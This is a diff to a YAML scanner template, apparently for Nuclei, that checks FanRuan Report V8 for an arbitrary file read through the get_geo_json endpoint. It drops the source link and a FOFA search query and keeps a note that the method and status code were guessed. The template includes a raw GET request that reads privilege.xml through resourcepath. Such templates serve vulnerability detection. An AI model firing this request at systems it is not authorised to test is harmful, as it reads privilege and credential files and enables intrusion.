@@ -3,14 +3,8 @@ info:
   name: 帆软报表V8get_geo_json任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/b8d68da9f013a3802aebbd8a76e11e73
-
-    [!] 推断说明: 状态码缺失, 推断为 200; 原文未标注HTTP方法, 推断为GET请求。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200; 原文未标注HTTP方法, 推断为GET请求。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: lfi,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: b8d68da9f013a3802aebbd8a76e11e73
-    fofa: + fofa`body="isSupportForgetPwd"`
 http:
 - raw:
   - 'GET /WebReport/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml HTTP/1.1
